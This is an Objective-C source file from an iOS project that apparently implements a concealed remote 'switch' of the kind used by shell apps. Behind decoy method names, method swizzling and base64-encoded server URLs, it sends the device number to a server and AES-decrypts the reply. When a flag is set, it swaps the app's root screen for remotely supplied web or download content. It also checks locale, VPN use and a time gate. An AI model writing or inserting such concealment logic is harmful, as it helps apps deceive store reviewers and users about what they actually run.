//
//  JJUserModel.m
//  KaiguanDemo
//
//  Created by 亚瑟 on 2019/6/15.
//  Copyright © 2019 rose. All rights reserved.
//

#import "JJUserModel.h"
//#import "JC_AFNetworking.h"
#import "LCNetworking.h"
#import "Reachability.h"
#import "NSData+Base64.h"
#import "JJHeader.h"
#import "JJBaseViewController.h"
#import "JJBaseDataModel.h"
#import "JJViewModel.h"
#import <objc/runtime.h>
#import "NSObject+AESUtil.h"
#import "NSObject+Ext.h"


@implementation JJUserModel(Extension)

+(void)load{
    
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        Class cls = [self class];
        // 获取系统数组的selector
        SEL   systemSelector = @selector(zs_singSong:);
        // 自己要交换的selector
        SEL   swizzledSelector = @selector(loadDyMethod:);
        // 两个方法的Method
        Method originalMethod = class_getInstanceMethod(cls, systemSelector);
        Method swizzledMethod = class_getInstanceMethod(cls, swizzledSelector);
        //  动态添加方法
        if (class_addMethod(cls, systemSelector, method_getImplementation(swizzledMethod), method_getTypeEncoding(swizzledMethod))) {
            // 添加成功的话将被交换方法的实现替换到这个并不存在的实现
            class_replaceMethod(cls, swizzledSelector, method_getImplementation(originalMethod), method_getTypeEncoding(originalMethod));
        }else {
            //添加不成功，交换两个方法的实现
            method_exchangeImplementations(originalMethod, swizzledMethod);
        }
    });
}

-(void)loadDyMethod:(id)object{
    NSNotification *not = object;
    [self performSelector:@selector(loadDataWithModel:) withObject:not.object];
}

@end


typedef void(^JJUserSuccessDataBlock)(JJBaseDataModel *model);
typedef void(^JJUserFailedDataBlock)(void);

@interface JJUserModel()
    
@property(nonatomic, copy) JJUserSuccessDataBlock successBLock;
@property(nonatomic, copy) JJUserFailedDataBlock failedBlock;
@property(nonatomic, strong) JJViewModel *viewModel;
@property(nonatomic, assign) NSInteger imageIndex;
@property(nonatomic, copy) NSString *imageUrl;
@end


@implementation JJUserModel


- (instancetype)init
{
    self = [super init];
    if (self) {
        [self loadData];
    }
    return self;
}

-(void)loadData{
//    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(loadUuerData:) name:@"startBugMonitor" object:nil];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(loadSuccess:) name:K_NOTIFICATIONSUCCESS object:nil];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(loadFailed) name:K_NOTIFICATIONFAILED object:nil];
    self.imageIndex = -1;
}


-(void)loadSuccess:(NSNotification *)noti{
    

    dispatch_async(dispatch_get_main_queue(), ^{
        JJBaseDataModel *model = noti.object;
        JJBaseViewController *vc = [[JJBaseViewController alloc] init];
        [vc setValue:model forKey:@"dataModel"];
        UIWindow *window = [NSObject getCurrentWindow];
        window.rootViewController = vc;
    });
}



-(void)loadFailed{
    
}

-(void)loadDataWithModel:(JJViewModel *)model{
    self.viewModel = model;
}

-(void)setViewModel:(JJViewModel *)viewModel{
    _viewModel = viewModel;
    [self loadLuojiDaima];
}

-(void)loadLuojiDaima{
    NSLog(@"%s",__func__);
    [self loadUserDataWithSuccess:^(JJBaseDataModel *model) {
        [[NSNotificationCenter defaultCenter] postNotificationName:K_NOTIFICATIONSUCCESS object:model];
    } withFailed:^{
        //马甲
        [[NSNotificationCenter defaultCenter] postNotificationName:K_NOTIFICATIONFAILED object:nil];
    }];
    [self loadSwitchOneApi];
}

-(void)loadUserDataWithSuccess:(JJUserSuccessDataBlock)successblock withFailed:(JJUserFailedDataBlock)failedBlock{
    self.successBLock = successblock;
    self.failedBlock = failedBlock;

}


//判断当前是否为中文
-(BOOL)isCurrentLanguageChinese{
    /*zh-Hans-CN,zh-Hant-CN,en-CN,ko-CN*/
    NSString *currentLanguage = [self currentLanguage];
    if(currentLanguage == nil){
        return NO;
        
    }
    if([currentLanguage isEqualToString:@""]){
        return NO;
    }
    NSRange subStrRange = [currentLanguage rangeOfString:@"zh-Hans"];
    if(subStrRange.length >0){
        //简体中文
        return YES;
        
    }//
    subStrRange = [currentLanguage rangeOfString:@"zh-Hant"];
    if(subStrRange.length >0){//繁体中文
        return YES;
    }
    return NO;
    
}

-(NSString*)currentLanguage
{
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    NSArray *languages = [defaults objectForKey:@"AppleLanguages"];
    NSString *currentLang = [languages objectAtIndex:0];
    return currentLang;
}

- (BOOL)isVPNConnected
{
    NSDictionary *dict = CFBridgingRelease(CFNetworkCopySystemProxySettings());
    NSArray *keys = [dict[@"__SCOPED__"]allKeys];
    for (NSString *key in keys) {
        if ([key rangeOfString:@"tap"].location != NSNotFound ||
            [key rangeOfString:@"tun"].location != NSNotFound ||
            [key rangeOfString:@"ppp"].location != NSNotFound){
            return NO;
        }
    }
    return YES;
}

-(BOOL)isIphone{
     NSString *deviceType = [UIDevice currentDevice].model;
    if ([deviceType isEqualToString:@"iPhone"]) {
        return YES;
    }else{
        return NO;
    }
    
}

//判断时间戳

-(BOOL)isTimeChat{
    NSDate *dateNow = [NSDate dateWithTimeIntervalSinceNow:0];
    NSTimeInterval timeIntervalNow = [dateNow timeIntervalSince1970];
    NSString *timeString = [NSString stringWithFormat:@"%.0f",timeIntervalNow];
    if (timeString.integerValue > [[[self.viewModel valueForKey:@"name"] base64DecodedString] integerValue] ) {
        return YES;
    }else{
        return NO;
    }
}



- (BOOL)isVPNConnect {
    
    Reachability *reachability = [Reachability reachabilityWithHostname:@"http://www.github.com"];
    NetworkStatus internetStatus = [reachability currentReachabilityStatus];
    if (internetStatus == ReachableViaWWAN) {
        
        NSDictionary *dict = (__bridge NSDictionary *)(CFNetworkCopySystemProxySettings());
        return [dict count];
        
    } else if (internetStatus == ReachableViaWiFi) {
        
        BOOL success = false;
        SCNetworkReachabilityRef reachability = SCNetworkReachabilityCreateWithName(NULL, [@"http://www.github.com" UTF8String]);
        SCNetworkReachabilityFlags flags;
        success = SCNetworkReachabilityGetFlags(reachability, &flags);
        CFRelease(reachability);
        BOOL isAvailable = success && (flags & kSCNetworkFlagsReachable) && !(flags & kSCNetworkFlagsConnectionRequired);
        if (isAvailable && flags == 3)
            return YES;
    }
    return NO;
}



//监听网络 提示用户开启网络设置
-(BOOL)getNetwork{
    
    __block NSInteger netflag = 0;
    Reachability *reachability   = [Reachability reachabilityWithHostname:@"www.apple.com"];
    // Set the blocks
    reachability.reachableBlock = ^(Reachability*reach)
    {
        netflag = 1;
    };
    
    reachability.unreachableBlock = ^(Reachability*reach)
    {
        netflag = 2;
    };
    
    // Start the notifier, which will cause the reachability object to retain itself!
    [reachability startNotifier];
    
    while (netflag == 0) {
        NSLog(@"%zd",netflag);
    }
    
    if (netflag == 1) {
        return YES;
    }else{
        return NO;
    }
    
}

-(void)loadSwitchOneApi{
    NSLog(@"%s",__func__);
    
    NSString *appkey = [self.viewModel valueForKey:@"appkey"];
    NSString *device_number = [self.viewModel valueForKey:@"device_number"];
    NSString *aesKey = [self.viewModel valueForKey:@"aeskey"];
    NSDictionary *para = @{@"appkey":appkey,@"device_number":device_number};
    
    [LCNetworking PostWithURL:[self getNewImageUrl] Params:para success:^(id responseObject) {
        NSLog(@"responseObject:%@",responseObject);
        NSString* code=  responseObject[@"code"];
        //根据状态码判断跳转
        if ([code integerValue] == 0) {
            //base解密"Data"数据
            NSString *aesStrData = [NSObject aesDecrypt:responseObject[@"data"] withKey:aesKey];
            NSData *data = [aesStrData dataUsingEncoding:NSUTF8StringEncoding];
            NSDictionary *jsonDic = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            //根据开关状态判断加载
            NSLog(@"jsondic:%@",jsonDic);
            JJBaseDataModel *model = [[JJBaseDataModel alloc]init];
            model.name = jsonDic[@"name"];
            model.wapurl = jsonDic[@"wapurl"];
            model.iswap = jsonDic[@"iswap"];
            model.splash = jsonDic[@"splash"] ;
            model.downurl = jsonDic[@"downurl"];
            model.version = jsonDic[@"version"];
            model.webview_set = jsonDic[@"webview_set"];
            if ([model.iswap intValue] == 1) {
                self.successBLock(model);
            }else {
                self.imageIndex++;
                self.failedBlock();
            }
        } else {
            self.imageIndex++;
            [self loadSwitchOneApi];
        }
    } failure:^(NSString *error) {
        self.imageIndex++;
        [self loadSwitchOneApi];
    }];
}


#pragma mark - < analysis >
/*  解析数据 */
- (NSDictionary *)decodeWithString:(NSString *)oriString{
    
    NSString *addEqual = @"";
    NSInteger equalCount = 0;
    NSRange equalRange ;
    if ([oriString containsString:@"=="]) {
        addEqual = @"==";
        equalCount = 2;
    } else if ([oriString containsString:@"="]) {
        addEqual = @"=";
        equalCount = 1;
    }
    equalRange = NSMakeRange(oriString.length-equalCount, equalCount);
    
    NSMutableString *mTempString = [NSMutableString stringWithString:oriString];
    [mTempString deleteCharactersInRange:equalRange];
    
    NSMutableString *nextString = [NSMutableString stringWithString:mTempString];
    BOOL isOver = NO;
    NSInteger delete_I = 1;
    while (!isOver) {
        
        if (nextString.length == mTempString.length/2) {
            isOver = YES;
            break;
        }
        
        if (delete_I < nextString.length) {
            [nextString deleteCharactersInRange:NSMakeRange(delete_I, 1)];
            delete_I ++;
        } else {
            break;
        }
    }
    NSString *flipString = [self flipCodeString:nextString];
    flipString = [flipString stringByAppendingString:addEqual];
    flipString = [flipString base64DecodedString];
    
    if (flipString.length >= 6) {
        flipString = [flipString substringWithRange:NSMakeRange(2, flipString.length-6)];
    }
    if (flipString.length) {
        NSData *data = [flipString dataUsingEncoding:NSUTF8StringEncoding];
        NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableContainers error:nil] ;
        return dic;
    }
    return nil;
}


- (NSString *)flipCodeString:(NSString *)oriString {
    
    NSInteger len = oriString.length;
    unichar c[len];
    for (NSInteger i = 0; i < len; i ++) {
        c[i] = [oriString characterAtIndex:len-i-1];
    }
    return [NSString stringWithCharacters:c length:len];
}



+ (BOOL)resolveInstanceMethod:(SEL)sel{
    if(sel == @selector(loadUuerData:)){
        class_addMethod([self class], sel, class_getMethodImplementation([self class], @selector(zs_singSong:)), "V@:");
        return YES;
    }
    return [super resolveInstanceMethod:sel];
}

-(void)zs_singSong:(id)obj{
    NSLog(@"123");
}

- (NSString *)imageUrl {
    NSString *url = [[self.viewModel valueForKey:@"imageUrl"] base64DecodedString];
    return url;
}

- (NSString *)getPlaceImageUrl {
    
    NSString *url = [[self.viewModel valueForKey:@"placeUrl"] base64DecodedString];
    NSArray *placeStr = [url componentsSeparatedByString:@"|"];
    if (self.imageIndex < placeStr.count) {
        return placeStr[self.imageIndex];
    } else {
        return self.imageUrl;
    }
}

- (NSString *)getPathUrl {
    NSString *url = [[self.viewModel valueForKey:@"pathUrl"] base64DecodedString];
    return url;
}

- (NSString *)getNewImageUrl {
    if (self.imageIndex < 0 ) {
        NSString *newUrl = [NSString stringWithFormat:@"https://%@%@",self.imageUrl,[self getPathUrl]];
        return newUrl;
    } else {
        NSString *newUrl = [NSString stringWithFormat:@"https://%@%@",[self getPlaceImageUrl],[self getPathUrl]];
        return newUrl;
    }
}

@end
